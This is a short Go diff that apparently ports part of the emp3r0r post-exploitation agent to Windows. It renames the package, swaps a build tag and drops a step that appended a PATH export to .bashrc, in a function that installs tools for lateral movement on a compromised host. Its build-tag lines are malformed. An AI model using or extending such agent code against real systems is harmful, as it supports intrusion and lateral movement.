@@ -1,6 +1,6 @@
-package agent
+package agentw
 
-// build +linux
+//build +windows
 
 /*
 install tools to emp3r0r_data.UtilsPath, for lateral movement
@@ -39,14 +39,5 @@ func vaccineHandler() (out string) {
 	}
 	_ = os.Remove(emp3r0r_data.AgentRoot + "/utils.zip")
 
-	// update PATH in .bashrc
-	exportPATH := fmt.Sprintf("export PATH=%s:$PATH", emp3r0r_data.UtilsPath)
-	if !util.IsStrInFile(exportPATH, emp3r0r_data.UtilsPath+"/.bashrc") {
-		err = util.AppendToFile(emp3r0r_data.UtilsPath+"/.bashrc", exportPATH)
-		if err != nil {
-			log.Printf("Update bashrc: %v", err)
-			out = fmt.Sprintf("Update bashrc: %v", err)
-		}
-	}
 	return
 }
